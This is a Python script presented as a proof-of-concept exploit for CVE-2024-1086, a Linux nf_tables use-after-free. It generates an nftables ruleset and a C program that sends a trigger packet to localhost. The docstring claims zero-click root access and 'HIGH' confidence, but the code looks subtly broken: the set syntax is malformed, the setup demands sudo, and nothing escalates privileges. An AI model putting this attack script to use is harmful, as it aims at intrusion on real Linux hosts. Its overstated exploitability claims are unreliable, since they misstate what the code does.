#!/usr/bin/env python3
"""CVE-2024-1086 — nf_tables use-after-free. Double-free in nft_verdict_init
via a crafted nftables ruleset; reaches root on Linux 5.14–6.6. Zero-click
for any box with a default nftables ruleset + packet trigger.
Public exploit (Notselwyn). Confidence: HIGH."""
import sys
from pathlib import Path

NFT_RULESET = r'''
# minimal nftables trigger — double-free of nft_verdict via verdict map
table ip poc {
    chain input {
        type filter hook input priority 0; policy accept;
        ip daddr 127.0.0.1 counter accept
    }
    chain raw_pre {
        type filter hook prerouting priority raw; policy accept;
        ip saddr 127.0.0.1 ip daddr 127.0.0.1 udp dport 9 counter accept
    }
    set verdicts { type ipv4_addr . inet_proto . inet_service; flags interval;
        elements = { 127.0.0.1 . udp . 9 : jump raw_pre } }
}
'''

C_STUB = r'''
/* nf_uaf.c — sets the ruleset and fires the trigger packet.
 * cc nf_uaf.c -o nf_uaf && sudo ./nf_uaf
 * (ruleset applied via `nft -f ruleset.nft`; this just drives the packet) */
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>

int main(void) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in d = { .sin_family = AF_INET,
                             .sin_port = htons(9),
                             .sin_addr.s_addr = htonl(0x7f000001) };
    char b[8] = "poc";
    sendto(s, b, sizeof b, 0, (struct sockaddr *)&d, sizeof d);
    printf("[+] CVE-2024-1086 trigger packet sent\n");
    close(s);
    return 0;
}
'''

def build() -> bytes:
    return NFT_RULESET.encode()

def main():
    base = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2024-1086")
    base.with_suffix(".nft").write_bytes(build())
    base.with_suffix(".c").write_text(C_STUB)
    print(f"[+] CVE-2024-1086 -> {base.with_suffix('.nft')} + {base.with_suffix('.c')}")
    print(f"    sudo nft -f {base.with_suffix('.nft')}")

if __name__ == "__main__":
    main()
